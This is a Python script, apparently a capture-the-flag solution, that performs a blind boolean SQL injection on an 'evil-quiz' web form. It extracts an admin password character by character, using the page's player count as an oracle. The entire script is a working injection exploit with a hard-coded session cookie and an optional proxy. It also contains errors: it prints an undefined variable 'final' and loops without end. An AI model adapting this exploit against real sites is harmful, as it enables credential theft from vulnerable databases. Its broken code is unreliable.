
import requests, time,re


dictionary = ['0','1','2','3','4','5','6','7','8','9','0','a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','_','{','}','-','$']

URL = "https://hackyholidays.h1ctf.com/evil-quiz/"
password = ""
headers = {'Cookie': 'session=49780cc698484223f6057689d396b3f8'}
http_proxy  = "http://192.168.*.*:9090"  # this is optional. To check the request and payload in burp
proxy = { "http"  : http_proxy}
while True:
    data = {'name' : 'max'}
    r = requests.post(url = URL , data = data, headers = headers,  proxies=proxy)
    for i in range(1,18):
        for x in dictionary:        

            data = {'name': '\' and (SELECT (CASE WHEN EXISTS(SELECT username FROM admin where username = \'admin\' and BINARY substring(password,'+str(i)+',1) = \'' + str(x) + '\')  then 1 else 0 end)) = 1 # '}
            
            r = requests.post(url = URL, data = data, headers = headers,  proxies=proxy)
           
            out = requests.get(url = URL + "score", headers = headers,  proxies=proxy)
            result = re.search('There is (.*) other player',out.text)
            
            if int(result.group(1)) > 0:
                password += str(x)
                print("Give me password plaease ::-> " + final)
                break
            else:
                pass
